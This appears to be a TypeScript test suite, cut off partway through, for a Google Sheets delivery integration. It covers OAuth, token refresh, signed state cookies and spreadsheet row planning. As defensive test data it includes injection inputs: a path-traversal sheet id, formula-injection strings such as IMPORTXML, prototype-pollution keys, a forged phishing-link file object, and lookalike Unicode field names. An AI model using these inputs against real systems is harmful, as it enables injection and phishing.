/**
 * Google Sheets as a destination (#67) — the OAuth half and the delivery half.
 *
 * No Google project, no network: every request goes to a fake `fetch` that
 * records it and answers however the test says. That is also how the claim
 * "this only ever talks to Google" is checked — the fake sees every URL.
 *
 * `node --experimental-strip-types tests/google-sheets.test.mts`. The database
 * side (the destination's health after a revoked grant, end to end through
 * dispatch) is in `tests/destinations-db.test.mts`.
 *
 * Written from the question "how does a lead go missing from somebody's sheet
 * without anyone being told?":
 *
 *   - a refresh token Google has invalidated, read as anything but `revoked`
 *   - a grant without the Sheets scope, accepted and failing on the first lead
 *   - the OAuth round trip completed in somebody else's browser
 */

import {
  exchangeCode,
  GOOGLE_SCOPES,
  GOOGLE_SHEETS_NOT_CONFIGURED,
  GOOGLE_TOKEN_ENDPOINT,
  googleAuthUrl,
  googleClient,
  googleRedirectUri,
  isGoogleSheetsConfigured,
  newNonce,
  openPendingConnection,
  refreshAccessToken,
  sealPendingConnection,
  SHEETS_SCOPE,
  type PendingConnection,
} from "../src/lib/destinations/google.ts";
import {
  cellValue,
  columnLetter,
  deliverGoogleSheets,
  MAX_HEADER_COLUMNS,
  MAX_HEADER_NAME_CHARS,
  neutraliseFormula,
  planRow,
  quoteSheetName,
  sheetRow,
  type RowEntry,
} from "../src/lib/destinations/adapters/google-sheets.ts";
import {
  buildConfig,
  parseConfig,
  parseSpreadsheetId,
  redactConfig,
} from "../src/lib/destinations/config.ts";
import { buildPayload, sampleSource } from "../src/lib/destinations/payload.ts";
import { RETRYABLE_FAILURES, type SubmissionPayload } from "../src/lib/destinations/types.ts";

let pass = 0;
let fail = 0;

const t = (name: string, got: unknown, want: unknown) => {
  const isOk = JSON.stringify(got) === JSON.stringify(want);
  if (isOk) pass++;
  else fail++;
  console.log(`  ${isOk ? "PASS" : "FAIL"}  ${name}`);
  if (!isOk) {
    console.log(`        got  ${JSON.stringify(got)}\n        want ${JSON.stringify(want)}`);
  }
};

const ok = (name: string, condition: boolean, detail?: unknown) => {
  if (condition) pass++;
  else fail++;
  console.log(`  ${condition ? "PASS" : "FAIL"}  ${name}`);
  if (!condition && detail !== undefined) console.log(`        ${JSON.stringify(detail)}`);
};

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

type Call = { url: string; method: string; body: string; headers: Record<string, string> };

/**
 * A `fetch` that answers from a list of handlers, first match wins, and records
 * everything it was asked. An unmatched request is a 599 rather than a throw,
 * so a test that forgot a handler fails on an assertion it can read.
 */
function fakeGoogle(
  handlers: Handler[],
) {
  const calls: Call[] = [];
  const impl = (async (url: string | URL | Request, init?: RequestInit) => {
    const call: Call = {
      url: String(url),
      method: init?.method ?? "GET",
      body: typeof init?.body === "string" ? init.body : "",
      headers: Object.fromEntries(
        Object.entries((init?.headers ?? {}) as Record<string, string>).map(([k, v]) => [
          k.toLowerCase(),
          v,
        ]),
      ),
    };
    calls.push(call);
    const handler = handlers.find((candidate) => candidate.match(call));
    if (!handler) return new Response("no handler", { status: 599 });
    const raw = typeof handler.body === "function" ? handler.body(call) : handler.body;
    const body = typeof raw === "string" ? raw : JSON.stringify(raw);
    return new Response(body, {
      status: handler.status,
      headers: { "content-type": "application/json" },
    });
  }) as unknown as typeof fetch;
  return { impl, calls };
}

type Handler = {
  match: (call: Call) => boolean;
  status: number;
  /** A fixed answer, or one computed from the request for a fake with state. */
  body: unknown | ((call: Call) => unknown);
};

const isToken = (call: Call) => call.url === GOOGLE_TOKEN_ENDPOINT;

/** The 0-based column a range like `'Leads'!C1` starts at. */
function startColumn(call: Call): number {
  const letters = /!([A-Z]+)1(?:\?|$)/.exec(decodeURIComponent(new URL(call.url).pathname))?.[1] ?? "A";
  return [...letters].reduce((n, letter) => n * 26 + (letter.charCodeAt(0) - 64), 0) - 1;
}

/**
 * A header row with state: reads return what writes put there. Needed since
 * the adapter reads the header back after writing it (security review M2) — a
 * fake that answered every read with the same canned header would make every
 * write look lost. `onWrite` runs after each write, so a test can play the part
 * of a second delivery overwriting the cell in between.
 */
function liveHeader(initial: string[], onWrite?: (header: string[], writes: number) => void) {
  const state = { header: [...initial], writes: 0 };
  const handlers: Handler[] = [
    {
      match: (call) => call.url.startsWith("https://sheets.googleapis.com/") && call.method === "GET" && decodeURIComponent(call.url).includes("!1:1"),
      status: 200,
      body: () => (state.header.length > 0 ? { values: [state.header] } : { range: "Leads!A1:Z1" }),
    },
    {
      match: (call) => call.url.startsWith("https://sheets.googleapis.com/") && call.method === "PUT",
      status: 200,
      body: (call: Call) => {
        const cells = (JSON.parse(call.body) as { values: string[][] }).values[0];
        const start = startColumn(call);
        cells.forEach((cell, offset) => {
          state.header[start + offset] = cell;
        });
        state.writes++;
        onWrite?.(state.header, state.writes);
        return { updatedCells: cells.length };
      },
    },
  ];
  return { state, handlers };
}

/** An unsigned JWT with the claims we read. The signature is never checked. */
function idToken(claims: Record<string, unknown>): string {
  const part = (value: unknown) => Buffer.from(JSON.stringify(value)).toString("base64url");
  return `${part({ alg: "RS256" })}.${part(claims)}.signature`;
}

function withEnv(values: Record<string, string | undefined>, run: () => Promise<void> | void) {
  const previous = Object.fromEntries(Object.keys(values).map((key) => [key, process.env[key]]));
  const restore = () => {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  };
  for (const [key, value] of Object.entries(values)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  return Promise.resolve()
    .then(run)
    .finally(restore);
}

const CLIENT = {
  GOOGLE_SHEETS_CLIENT_ID: "client-id.apps.googleusercontent.com",
  GOOGLE_SHEETS_CLIENT_SECRET: "client-secret-value",
};

// ---------------------------------------------------------------------------

async function configuration() {
  console.log("\nconfiguration");

  await withEnv({ GOOGLE_SHEETS_CLIENT_ID: undefined, GOOGLE_SHEETS_CLIENT_SECRET: undefined }, () => {
    t("no client without both variables", googleClient(), null);
    ok("and it says it is not configured", !isGoogleSheetsConfigured());
  });

  await withEnv({ ...CLIENT, GOOGLE_SHEETS_CLIENT_SECRET: "  " }, () => {
    ok("a blank secret is not a secret", !isGoogleSheetsConfigured());
  });

  await withEnv(CLIENT, () => {
    ok("configured with both", isGoogleSheetsConfigured());
  });

  await withEnv({ GOOGLE_SHEETS_REDIRECT_URI: undefined }, () => {
    t(
      "the callback is derived from the origin the person is on",
      googleRedirectUri("http://localhost:3000"),
      "http://localhost:3000/api/v1/integrations/google-sheets/callback",
    );
  });
  await withEnv({ GOOGLE_SHEETS_REDIRECT_URI: "https://app.example.com/cb" }, () => {
    t("and can be pinned for a proxy", googleRedirectUri("http://internal:3000"), "https://app.example.com/cb");
  });

  const url = new URL(
    googleAuthUrl({
      client: { clientId: "cid", clientSecret: "never-in-a-url" },
      redirectUri: "https://app.example.com/cb",
      state: "nonce-123",
      loginHint: "ops@example.com",
    }),
  );
  t("the consent screen is Google's", url.origin, "https://accounts.google.com");
  t("asks for a refresh token", url.searchParams.get("access_type"), "offline");
  // Without `prompt=consent` Google only issues a refresh token on the first
  // grant, so a reconnect would succeed and store nothing usable.
  t("every time, not only the first", url.searchParams.get("prompt"), "consent");
  t("carries the state", url.searchParams.get("state"), "nonce-123");
  t("asks for exactly the scopes we use", url.searchParams.get("scope"), GOOGLE_SCOPES.join(" "));
  ok("including the spreadsheets one", (url.searchParams.get("scope") ?? "").includes(SHEETS_SCOPE));
  t("prefills the account on a reconnect", url.searchParams.get("login_hint"), "ops@example.com");
  ok("and never carries the client secret", !url.toString().includes("never-in-a-url"));
}

// ---------------------------------------------------------------------------

async function codeExchange() {
  console.log("\ncode exchange");

  await withEnv({ GOOGLE_SHEETS_CLIENT_ID: undefined, GOOGLE_SHEETS_CLIENT_SECRET: undefined }, async () => {
    const google = fakeGoogle([]);
    const result = await exchangeCode({ code: "c", redirectUri: "https://x/cb", fetchImpl: google.impl });
    ok("refuses without a client", !result.ok);
    t("and makes no request", google.calls.length, 0);
  });

  await withEnv(CLIENT, async () => {
    const google = fakeGoogle([
      {
        match: isToken,
        status: 200,
        body: {
          access_token: "ya29.access",
          refresh_token: "1//refresh",
          scope: `openid ${SHEETS_SCOPE} https://www.googleapis.com/auth/userinfo.email`,
          id_token: idToken({ email: "ops@dorsetmetal.example" }),
        },
      },
    ]);
    const result = await exchangeCode({
      code: "auth-code",
      redirectUri: "https://app.example.com/cb",
      fetchImpl: google.impl,
    });
    ok("a full grant succeeds", result.ok, result);
    if (result.ok) {
      t("with the refresh token", result.refreshToken, "1//refresh");
      t("and the account it belongs to", result.email, "ops@dorsetmetal.example");
    }
    t("one request", google.calls.length, 1);
    const sent = new URLSearchParams(google.calls[0]?.body ?? "");
    t("posted to the token endpoint", google.calls[0]?.url, GOOGLE_TOKEN_ENDPOINT);
    t("as an authorization_code grant", sent.get("grant_type"), "authorization_code");
    t("with the same redirect it was issued for", sent.get("redirect_uri"), "https://app.example.com/cb");

    // Google's consent screen lets the person untick a scope. A destination
    // made from that grant would fail on its first lead.
    const narrow = fakeGoogle([
      {
        match: isToken,
        status: 200,
        body: { access_token: "a", refresh_token: "r", scope: "openid email" },
      },
    ]);
    const refused = await exchangeCode({ code: "c", redirectUri: "https://x/cb", fetchImpl: narrow.impl });
    ok("a grant without the Sheets scope is refused", !refused.ok);
    ok(
      "and says which box to leave ticked",
      !refused.ok && /Google Sheets box/.test(refused.error),
      refused,
    );

    const noRefresh = fakeGoogle([
      { match: isToken, status: 200, body: { access_token: "a", scope: SHEETS_SCOPE } },
    ]);
    const short = await exchangeCode({ code: "c", redirectUri: "https://x/cb", fetchImpl: noRefresh.impl });
    ok("a grant with no refresh token is refused rather than dying in an hour", !short.ok, short);

    const badCode = fakeGoogle([
      { match: isToken, status: 400, body: { error: "invalid_grant" } },
    ]);
    const bad = await exchangeCode({ code: "c", redirectUri: "https://x/cb", fetchImpl: badCode.impl });
    ok("a used or expired code is refused", !bad.ok);
    ok("and names Google's reason", !bad.ok && bad.error.includes("invalid_grant"), bad);
  });
}

// ---------------------------------------------------------------------------

async function refresh() {
  console.log("\nrefreshing the token");

  await withEnv({ GOOGLE_SHEETS_CLIENT_ID: undefined, GOOGLE_SHEETS_CLIENT_SECRET: undefined }, async () => {
    const google = fakeGoogle([]);
    const result = await refreshAccessToken("1//refresh", { fetchImpl: google.impl });
    t("without a client it is a configuration failure", result.ok ? null : result.failure, "configuration");
    t("with the sentence for both readers", result.ok ? null : result.error, GOOGLE_SHEETS_NOT_CONFIGURED);
    t("and no request", google.calls.length, 0);
  });

  await withEnv(CLIENT, async () => {
    const good = fakeGoogle([{ match: isToken, status: 200, body: { access_token: "ya29.fresh" } }]);
    const fresh = await refreshAccessToken("1//refresh", { fetchImpl: good.impl });
    t("a live grant gives an access token", fresh.ok ? fresh.accessToken : fresh, "ya29.fresh");
    const sent = new URLSearchParams(good.calls[0]?.body ?? "");
    t("as a refresh_token grant", sent.get("grant_type"), "refresh_token");

    // Every way a refresh token dies comes back as this one answer.
    const revoked = fakeGoogle([
      {
        match: isToken,
        status: 400,
        body: { error: "invalid_grant", error_description: "Token has been expired or revoked." },
      },
    ]);
    const dead = await refreshAccessToken("1//refresh", { fetchImpl: revoked.impl });
    t("invalid_grant is revoked", dead.ok ? null : dead.failure, "revoked");
    t("with Google's status kept", dead.ok ? null : dead.responseStatus, 400);
    ok(
      "and Google's own words kept for the log",
      !dead.ok && (dead.responseBody ?? "").includes("expired or revoked"),
      dead,
    );

    // The control for the assertion above: a 400 that is *not* invalid_grant
    // must not be read as revoked, or every Google hiccup would tell the
    // customer to reconnect.
    const client = fakeGoogle([{ match: isToken, status: 401, body: { error: "invalid_client" } }]);
    const ours = await refreshAccessToken("1//refresh", { fetchImpl: client.impl });
    t("our own client being rejected is configuration, not revoked", ours.ok ? null : ours.failure, "configuration");
    ok(
      "and says it is not the customer's connection",
      !ours.ok && /not anything you connected/.test(ours.error),
      ours,
    );

    const down = fakeGoogle([{ match: isToken, status: 503, body: "unavailable" }]);
    const outage = await refreshAccessToken("1//refresh", { fetchImpl: down.impl });
    t("a Google outage is retryable", outage.ok ? null : outage.failure, "target_down");

    const throwing = (async () => {
      throw new TypeError("fetch failed", { cause: Object.assign(new Error("getaddrinfo ENOTFOUND"), { code: "ENOTFOUND" }) });
    }) as unknown as typeof fetch;
    const unreachable = await refreshAccessToken("1//refresh", { fetchImpl: throwing });
    t("an unreachable Google is network", unreachable.ok ? null : unreachable.failure, "network");
  });
}

// ---------------------------------------------------------------------------

async function roundTrip() {
  console.log("\nthe round trip through Google");

  const now = new Date("2026-10-01T12:00:00Z");
  const pending: PendingConnection = {
    userId: "0199a0fa-0000-7000-8000-000000000001",
    slug: "acme",
    endpointPublicId: "ep_abc",
    destinationId: null,
    name: "Leads sheet",
    spreadsheetId: "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789",
    sheetName: "",
    nonce: newNonce(),
    expiresAt: now.getTime() + 600_000,
  };

  await withEnv({ AUTH_SECRET: "a-test-auth-secret-that-is-long", NODE_ENV: "test" }, () => {
    const sealed = sealPendingConnection(pending);
    ok("it seals", typeof sealed === "string" && sealed.includes("."));
    t("and opens with the matching nonce", openPendingConnection(sealed, pending.nonce, now), pending);

    // The attack `state` exists for: the callback reached with somebody
    // else's nonce. The cookie in this browser is not the one that started it.
    t("a different nonce opens nothing", openPendingConnection(sealed, newNonce(), now), null);
    t("no state opens nothing", openPendingConnection(sealed, null, now), null);
    t("no cookie opens nothing", openPendingConnection(null, pending.nonce, now), null);

    const [body, signature] = (sealed ?? ".").split(".");
    const forged = Buffer.from(
      JSON.stringify({ ...pending, spreadsheetId: "attacker-sheet" }),
    ).toString("base64url");
    t("a rewritten body with the old signature opens nothing", openPendingConnection(`${forged}.${signature}`, pending.nonce, now), null);
    // The control: the untouched body with the same signature does open, so
    // the line above failed on the forgery and not on the splitting.
    ok("while the untouched body does", openPendingConnection(`${body}.${signature}`, pending.nonce, now) !== null);

    t(
      "an expired one opens nothing",
      openPendingConnection(sealed, pending.nonce, new Date(pending.expiresAt + 1)),
      null,
    );
  });

  await withEnv({ AUTH_SECRET: "a-different-secret-entirely-xx", NODE_ENV: "test" }, () => {
    const sealedElsewhere = (() => {
      const previous = process.env.AUTH_SECRET;
      process.env.AUTH_SECRET = "a-test-auth-secret-that-is-long";
      const value = sealPendingConnection(pending);
      process.env.AUTH_SECRET = previous;
      return value;
    })();
    t("a cookie signed under another key opens nothing", openPendingConnection(sealedElsewhere, pending.nonce, now), null);
  });

  await withEnv({ AUTH_SECRET: undefined, NODE_ENV: "production" }, () => {
    t("production with no AUTH_SECRET refuses to seal", sealPendingConnection(pending), null);
  });

  // L4: the built-in key only for development and test, named explicitly.
  let devSealed: string | null = null;
  await withEnv({ AUTH_SECRET: undefined, NODE_ENV: "development" }, () => {
    devSealed = sealPendingConnection(pending);
  });
  for (const env of [undefined, "staging", "preview", ""]) {
    await withEnv({ AUTH_SECRET: undefined, NODE_ENV: env }, () => {
      t(`NODE_ENV=${JSON.stringify(env)} with no AUTH_SECRET refuses to seal`, sealPendingConnection(pending), null);
      t(
        "and will not open a cookie signed with the built-in key",
        openPendingConnection(devSealed, pending.nonce, now),
        null,
      );
    });
  }
  // The control: the same call in development does seal, so the refusals
  // above are the environment rule and not sealing being broken.
  for (const env of ["development", "test"]) {
    await withEnv({ AUTH_SECRET: undefined, NODE_ENV: env }, () => {
      ok(`NODE_ENV=${env} uses the built-in key`, typeof sealPendingConnection(pending) === "string");
    });
  }
}

// ---------------------------------------------------------------------------
// The destination's config
// ---------------------------------------------------------------------------

const SHEET_ID = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";
const REFRESH = "1//refresh-token-that-must-never-be-shown";
const ACCESS = "ya29.access-token-that-must-never-be-logged";

const storedConfig = {
  spreadsheetId: SHEET_ID,
  sheetName: "Leads",
  refreshToken: REFRESH,
  account: "ops@dorsetmetal.example",
  spreadsheetTitle: "Inbound leads",
  connectedAt: "2026-10-01T12:00:00.000Z",
};

async function config() {
  console.log("\nconfig and redaction");

  t(
    "the id comes out of a pasted browser URL",
    parseSpreadsheetId(`https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit#gid=0`),
    SHEET_ID,
  );
  t("a bare id is accepted", parseSpreadsheetId(` ${SHEET_ID} `), SHEET_ID);
  t("a Google Doc is not a spreadsheet", parseSpreadsheetId(`https://docs.google.com/document/d/${SHEET_ID}/edit`), null);
  t("another host is not Google", parseSpreadsheetId(`https://docs.evil.example/spreadsheets/d/${SHEET_ID}/`), null);
  t("a path is not an id", parseSpreadsheetId("../../drive/v3/files"), null);

  // The id is interpolated into every request path. A stored row that somehow
  // carries a slash must not reach `fetch` at all.
  let threw = false;
  try {
    parseConfig("google_sheets", { ...storedConfig, spreadsheetId: "abc/../../drive/v3/files" });
  } catch {
    threw = true;
  }
  ok("a stored id with a path in it does not parse", threw);

  const renamed = buildConfig("google_sheets", { sheetName: "Q4 leads" }, storedConfig);
  ok("an edit can change the tab", renamed.ok && renamed.config.sheetName === "Q4 leads", renamed);
  ok("and keeps the token it was never shown", renamed.ok && renamed.config.refreshToken === REFRESH);
  const blank = buildConfig("google_sheets", { sheetName: "  " }, storedConfig);
  ok("an empty tab field keeps the tab", blank.ok && blank.config.sheetName === "Leads", blank);

  const redacted = redactConfig("google_sheets", storedConfig);
  const serialised = JSON.stringify(redacted);
  ok("the redacted shape has no refresh token", !serialised.includes(REFRESH), serialised);
  // The control: the same check against the raw config finds it, so the line
  // above is a real absence rather than a search that could never match.
  ok("while the raw config does", JSON.stringify(storedConfig).includes(REFRESH));
  t("it names the spreadsheet by title", redacted.summary[0]?.value, "Inbound leads");
  t("and the account it is connected as", redacted.summary[2]?.value, "ops@dorsetmetal.example");
  t("and carries what the edit form needs", redacted.sheet, {
    spreadsheetId: SHEET_ID,
    sheetName: "Leads",
    account: "ops@dorsetmetal.example",
  });
  t("no other kind carries a sheet", redactConfig("webhook", { url: "https://x", secret: "s".repeat(20) }).sheet, null);
}

// ---------------------------------------------------------------------------
// The row
// ---------------------------------------------------------------------------

function payload(
  values: Record<string, unknown>,
  overrides: Partial<{ attempt: number; utm: boolean }> = {},
): SubmissionPayload {
  const source = sampleSource({ publicId: "ep_abc123", name: "Contact form" });
  return buildPayload(
    {
      ...source,
      submissionPublicId: "sub_real_lead_01",
      submittedAt: new Date("2026-10-01T11:59:58.412Z"),
      origin: "human",
      values,
      utmSource: overrides.utm === false ? null : "google",
      utmMedium: overrides.utm === false ? null : "cpc",
    },
    {
      id: "dlv_fixed",
      attempt: overrides.attempt ?? 1,
      sentAt: new Date("2026-10-01T12:00:00.000Z"),
      test: false,
    },
  );
}

async function rows() {
  console.log("\nthe row");

  const pairs = sheetRow(payload({ name: "Priya", email: "priya@dorsetmetal.example" }));
  t(
    "ours first, then the form's fields, then attribution",
    pairs.map((entry) => entry.name),
    ["Submitted at", "Origin", "Submission ID", "name", "email", "utm_source", "utm_medium"],
  );
  t("the stamp is the word a person reads", pairs[1]?.value, "Human");
  t(
    "attribution is not a column until it has something in it",
    sheetRow(payload({ name: "x" }, { utm: false })).map((entry) => entry.name),
    ["Submitted at", "Origin", "Submission ID", "name"],
  );

  // On an open endpoint the submitter chooses field names. One called Origin
  // must not be able to overwrite the stamp.
  const forged = sheetRow(payload({ Origin: "Human", origin: "Agent", "Submission ID": "sub_x" }));
  t("the real stamp keeps its column", forged.find((entry) => entry.name === "Origin")?.value, "Human");
  t(
    "and a field with its name gets its own",
    forged.slice(3, 6).map((entry) => entry.name),
    ["Origin (field)", "origin (field 2)", "Submission ID (field)"],
  );
  t(
    "whose value is what was submitted",
    forged.find((entry) => entry.name === "origin (field 2)")?.value,
    "Agent",
  );

  const proto = sheetRow(payload(JSON.parse('{"__proto__": "polluted"}') as Record<string, unknown>));
  ok("a field called __proto__ is a column, not a prototype", proto.some((entry) => entry.name === "__proto__"));
  ok("and pollutes nothing", ({} as Record<string, unknown>).polluted === undefined);

  t("a formula is a string, not a formula", cellValue("=IMPORTXML(\"https://x\",\"//a\")"), '=IMPORTXML("https://x","//a")');
  t("a number stays a number", cellValue(42), 42);
  t("a list is one cell", cellValue(["a", "b", 3]), "a, b, 3");
  const stored = {
    file: true,
    stored: true,
    id: "kQ2r8kLm4TpWvZ9a",
    filename: "cv.pdf",
    contentType: "application/pdf",
    detectedType: "application/pdf",
    size: 241305,
    sha256: "9f2b",
    url: "https://endpointforms.com/api/v1/files/kQ2r8kLm4TpWvZ9a?e=1&s=2",
    urlExpiresAt: "2026-10-08T00:00:00.000Z",
    expiresAt: null,
  };
  t(
    "an upload is its name and its link",
    cellValue(stored),
    "cv.pdf — https://endpointforms.com/api/v1/files/kQ2r8kLm4TpWvZ9a?e=1&s=2",
  );

  // M1: file-shaped JSON a submitter posted. Rendered as an attachment, it
  // would be a phishing link dressed as a file we hold.
  const forgedFile = cellValue({ file: true, filename: "Invoice.pdf", url: "https://evil.example/login" });
  ok("a partial file shape is not rendered as an attachment", !String(forgedFile).startsWith("Invoice.pdf —"), forgedFile);
  t("it is written as the JSON it is", forgedFile, '{"file":true,"filename":"Invoice.pdf","url":"https://evil.example/login"}');
  const fullForgery = cellValue({ ...stored, filename: "Invoice.pdf", url: "https://evil.example/api/v1/files/kQ2r8kLm4TpWvZ9a" });
  ok(
    "nor is a complete shape whose link is not ours",
    !String(fullForgery).startsWith("Invoice.pdf —"),
    fullForgery,
  );
  const otherId = cellValue({ ...stored, url: "https://endpointforms.com/api/v1/files/someoneElse?e=1&s=2" });
  ok("nor one whose link names a different file", !String(otherId).startsWith("cv.pdf —"), otherId);
  const long = cellValue("x".repeat(60_000)) as string;
  ok("a value past Google's cell limit is cut to fit", long.length === 50_000, long.length);
  ok("and says so", long.endsWith("… truncated"));

  t("A", columnLetter(0), "A");
  t("Z", columnLetter(25), "Z");
  t("AA", columnLetter(26), "AA");
  t("ZZ", columnLetter(701), "ZZ");
  t("AAA", columnLetter(702), "AAA");
  t("a tab name with an apostrophe is quoted", quoteSheetName("Priya's leads"), "'Priya''s leads'");

  const ourEntry = (name: string, value: string): RowEntry => ({
    name,
    value,
    source: "ours",
    key: name,
    declared: false,
  });
  const field = (name: string, value: string, declared = false): RowEntry => ({
    name,
    value,
    source: "field",
    key: name,
    declared,
  });
  const ours = [
    ourEntry("Submitted at", "2026"),
    ourEntry("Origin", "Human"),
    ourEntry("Submission ID", "sub_1"),
    field("email", "p@x"),
  ];

  const empty = planRow([], ours);
  t("an empty tab gets the whole header", empty.added, ["Submitted at", "Origin", "Submission ID", "email"]);
  t("and the row under it", empty.row, ["2026", "Human", "sub_1", "p@x"]);

  // The customer reordered their columns, renamed the case of one, and added
  // their own between ours.
  const reordered = planRow(["EMAIL", "Called back?", "submission id", "Origin", "", "Submitted at"], ours);
  t("a reordered header needs no new columns", reordered.added, []);
  t(
    "and every value lands under its own name",
    reordered.row,
    ["p@x", "", "sub_1", "Human", "", "2026"],
  );
  t("the id column is found where it moved to", reordered.idColumn, 2);

  const grown = planRow(["Submitted at", "Origin", "Submission ID"], [...ours, field("phone", "0123")]);
  t("a field the header lacks is added at the right", grown.added, ["email", "phone"]);
  t("and the row is as wide as the new header", grown.row, ["2026", "Human", "sub_1", "p@x", "0123"]);

  const duplicated = planRow(["email", "email"], [field("email", "p@x")]);
  t("a duplicated header column gets the value once", duplicated.row, ["p@x", ""]);

  // M3: who may add a column.
  console.log("\nwho may add a column (M3)");
  const base = ["Submitted at", "Origin", "Submission ID", "email"];
  const withSchema = planRow(
    base,
    [...ours, field("company", "Dorset Metal", true), field("invented", "x"), field("also_invented", "y")],
    { hasSchema: true },
  );
  t(
    "with a schema, a declared field gets a column and invented ones do not",
    withSchema.added,
    ["company", "Other fields"],
  );
  t(
    "the invented ones share one Other fields column, as JSON",
    withSchema.row.at(-1),
    // `email` is in the header but undeclared, so it overflows too (M4).
    '{"email":"p@x","invented":"x","also_invented":"y"}',
  );
  // The control: the same invented field without a schema does get a column,
  // so the refusal above is the schema rule and not a planner that never adds.
  t(
    "without a schema the same field gets its own column",
    planRow(base, [...ours, field("invented", "x")]).added,
    ["invented"],
  );

  const flood = Array.from({ length: 2_000 }, (_, i) => field(`junk_${i}`, "v"));
  const capped = planRow(base, [...ours, ...flood]);
  t(
    "without a schema, two thousand invented fields stop at the column cap",
    base.length + capped.added.length,
    MAX_HEADER_COLUMNS,
  );
  t("with Other fields as the last column", capped.added.at(-1), "Other fields");
  ok(
    "holding everything past the cap",
    String(capped.row.at(-1)).includes("junk_1999") && !String(capped.row.at(-1)).includes('"junk_0"'),
    String(capped.row.at(-1)).slice(0, 80),
  );
  const wide = Array.from({ length: 120 }, (_, i) => `Theirs ${i}`);
  const already = planRow(wide, [...ours, field("note", "hi")]);
  t(
    "a sheet already past the cap gets no new field columns, only Other fields",
    already.added,
    ["Submitted at", "Origin", "Submission ID", "Other fields"],
  );

  const longKey = "k".repeat(300);
  const longRow = sheetRow(payload({ [longKey]: "v" }, { utm: false }));
  t(
    "a header name is cut at 100 characters",
    longRow.at(-1)?.name.length,
    MAX_HEADER_NAME_CHARS,
  );
  t("while Other fields keeps the key as submitted", longRow.at(-1)?.key.length, 300);

  // M5: what an export to Excel would evaluate.
  console.log("\nformula prefixes (M5)");
  for (const value of ["=1+1", "+1", "-1+1", "@SUM(A1)", "  =1", "\t1", "\r1"]) {
    t(`${JSON.stringify(value)} is quoted`, neutraliseFormula(value), `'${value}`);
  }
  // The control: ordinary text, and a dash or equals sign later in the value,
  // are left exactly as submitted.
  for (const value of ["Priya", "a=b", "1-2", "priya@dorsetmetal.example", ""]) {
    t(`${JSON.stringify(value)} is left alone`, neutraliseFormula(value), value);
  }
  t(
    "a planned row quotes a string cell but not a number",
    planRow([], [field("a", "=1+1"), { name: "n", value: -5, source: "field", key: "n", declared: false }]).row,
    ["'=1+1", -5],
  );

  // M4: lookalike stamps, and writing into somebody else's column.
  console.log("\nlookalikes and customer columns (M4)");
  const zeroWidth = sheetRow(payload({ "Origin​": "Human" }, { utm: false }));
  t("Origin with a zero-width space is still renamed", zeroWidth[3]?.name, "Origin​ (field)");
  t(
    "and does not land in the real Origin column",
    planRow(["Submitted at", "Origin", "Submission ID"], zeroWidth).row,
    [zeroWidth[0]?.value, "Human", "sub_real_lead_01", "Human"],
  );
  const fullwidth = sheetRow(payload({ "Ｏｒｉｇｉｎ": "Human" }, { utm: false }));
  t("fullwidth Origin folds under NFKC and is renamed", fullwidth[3]?.name, "Ｏｒｉｇｉｎ (field)");
  const joiner = sheetRow(payload({ "Submission⁠ ID": "sub_forged" }, { utm: false }));
  ok("a word joiner inside Submission ID is renamed", joiner[3]?.name.endsWith("(field)") ?? false, joiner[3]?.name);
  // Not folded, and said so: a Cyrillic О is a different letter, not a
  // compatibility form. It gets a column that looks like ours, never ours.
  const cyrillic = sheetRow(payload({ "Оrigin": "Human" }, { utm: false }));
  const cyrillicPlan = planRow(["Submitted at", "Origin", "Submission ID"], cyrillic);
  t("a Cyrillic lookalike cannot write into the real Origin column", cyrillicPlan.row[1], "Human");
  t("it gets a column of its own", cyrillicPlan.added, ["Оrigin"]);

  const utmField = sheetRow(payload({ utm_source: "forged" }));
  t(
    "a field called utm_source does not take the attribution column",
    utmField.find((entry) => entry.name === "utm_source")?.value,
    "google",
  );

  const theirs = ["Submitted at", "Origin", "Submission ID", "email", "Approved"];
  const sneaky = [...ours, field("Approved", "yes")];
  // Without a schema every field name is the submitter's, and matching by
  // name is the feature: a field called Approved fills a column called
  // Approved. Documented in docs/28 as the schema-less trade-off.
  t(
    "without a schema, a field named after a customer column writes into it",
    planRow(theirs, sneaky).row,
    ["2026", "Human", "sub_1", "p@x", "yes"],
  );
  const guarded = planRow(theirs, sneaky, { hasSchema: true });
  t("with a schema, an undeclared field cannot write into it", guarded.row[4], "");
  t("it goes to Other fields instead", guarded.row.at(-1), '{"email":"p@x","Approved":"yes"}');
  t(
    "while a declared one still can",
    planRow(theirs, [...ours.slice(0, 3), field("email", "p@x", true), field("Approved", "yes", true)], { hasSchema: true }).row,
    ["2026", "Human", "sub_1", "p@x", "yes"],
  );
}

// ---------------------------------------------------------------------------
// Delivering, against a fake Google
// ---------------------------------------------------------------------------

const isSheets = (method: string, fragment: string) => (call: Call) =>
  call.url.startsWith("https://sheets.googleapis.com/") &&
  call.method === method &&
  decodeURIComponent(call.url).includes(fragment);

const tokenOk = { match: isToken, status: 200, body: { access_token: ACCESS } };
const appendOk = {
  match: isSheets("POST", ":append"),
  status: 200,
  body: { spreadsheetId: SHEET_ID, updates: { updatedRange: "Leads!A2:H2", updatedRows: 1 } },
};

async function deliver(
  handlers: Parameters<typeof fakeGoogle>[0],
  options: {
    config?: Record<string, unknown>;
    payload?: SubmissionPayload;
    declaredFields?: string[] | null;
  } = {},
) {
  const google = fakeGoogle(handlers);
  const result = await deliverGoogleSheets({
    destinationName: "Leads sheet",
    payload: options.payload ?? payload({ name: "Priya", email: "priya@dorsetmetal.example" }),
    config: options.config ?? storedConfig,
    fetchImpl: google.impl,
    declaredFields: options.declaredFields ?? null,
  });
  return { result, calls: google.calls };
}

async function delivery() {
  console.log("\ndelivery");

  await withEnv(CLIENT, async () => {
    // An empty tab: header written, then the row.
    const first = await deliver([
      tokenOk,
      ...liveHeader([]).handlers,
      appendOk,
    ]);
    ok("an empty tab is delivered to", first.result.ok, first.result);
    t(
      "token, header, header write, header read-back, append — in that order",
      first.calls.map((call) => call.method),
      ["POST", "GET", "PUT", "GET", "POST"],
    );
    const hosts = new Set(first.calls.map((call) => new URL(call.url).host));
    t("and nothing but Google was asked", [...hosts].sort(), ["oauth2.googleapis.com", "sheets.googleapis.com"]);
    ok(
      "every Sheets request carries the fresh access token",
